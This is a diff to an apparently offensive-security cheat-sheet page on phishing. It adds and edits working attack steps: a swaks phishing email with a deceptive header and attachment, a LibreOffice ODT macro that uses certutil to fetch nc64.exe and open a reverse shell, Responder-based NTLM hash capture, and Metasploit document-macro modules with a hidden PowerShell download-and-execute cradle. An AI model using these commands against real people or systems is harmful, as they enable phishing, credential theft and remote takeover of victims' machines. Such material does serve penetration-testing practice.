@@ -1,7 +1,14 @@
 ---
 title: "Phishing"
-date: 2025-7-25
-tags: ["Phishing", "Social Engineering", "Responder", "Phishing Campaigns", "Email", "Xll", "Excel", "Hta", "Shortcut", "Windows", "Odt", "Libre", "Vba", "Ntlm_Theft", "Pdf", "Ntlm"]
+tags: ["Phishing", "Social Engineering", "Responder", "Phishing Campaigns", "Email", "xll", "Excel", "hta", "Shortcut", "Windows", "odt", "Libre", "vba", "NTLM Theft", "pdf", "NTLM"]
+---
+
+### Send Email
+
+```console
+swaks --to '<VICTIM>@<DOMAIN>' --from 'attacker@<DOMAIN>' --server '<DOMAIN>' --header 'This is not a malicious file' --body 'Check this out: http://<LOCAL_IP>:<PORT>' --attach '@<FILE>'
+```
+
 ---
 
 {{< tab set1 tab1 >}}lnk{{< /tab >}}
@@ -158,6 +165,8 @@ mput evil.scf
 {{< /tabcontent >}}
 {{< tabcontent set1 tab5 >}}
 
+### Manual
+
 ```console
 +--------------------------------------------------------+
 | 1. "Tools" > "Macros" > "Organize Macros" > "Basic..." |
@@ -170,7 +179,7 @@ mput evil.scf
 
 ```console
 Sub OnLoad
-    shell("cmd /c certutil -urlcache -split -f http://<LOCAL_IP>/nc64.exe C:\programdata\nc64.exe && C:\programdata\nc64.exe -e cmd <LOCAL_IP> <LOCAL_PORT>")
+    shell("cmd /c certutil -urlcache -split -f http://<LOCAL_IP>:<PORT>/nc64.exe C:\programdata\nc64.exe && C:\programdata\nc64.exe -e cmd <LOCAL_IP> <LOCAL_PORT>")
 End Sub
 ```
 
@@ -182,6 +191,75 @@ End Sub
 | 5. "Events" > "Open Document" > "OK"                      |
 | 6. "SAVE"                                                 |
 +-----------------------------------------------------------+
+```
+
+---
+
+### Metasploit
+
+#### 1. Capture NTLM
+
+```console
+# Start responder
+sudo responder -I <INTERFACE>
+```
+
+```console {class="sample-code"}
+sudo responder -I tun0
+```
+
+```console
+# File write require root privilege
+sudo msfconsole -q
+```
+
+```console
+use auxiliary/fileformat/odt_badodt
+```
+
+```console
+set lhost <LOCAL_IP>
+```
+
+```console
+run
+```
+
+#### 2. RCE
+
+```console
+# Start http server
+python3 -m http.server <PORT>
+```
+
+```console
+# Start listener
+rlwrap ncat -lvnp <LOCAL_PORT>
+```
+
+```console
+# msfconsole
+use multi/misc/openoffice_document_macro
+```
+
+```console
+set payload windows/x64/exec
+```
+
+```console
+set cmd "powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<PORT>/<SHELL_SCRIPT>');"
+```
+
+```console
+set srvhost <LOCAL_IP>
+```
+
+```console
+set lhost <LOCAL_IP>
+```
+
+```console
+run
 ```
 
 {{< /tabcontent >}}
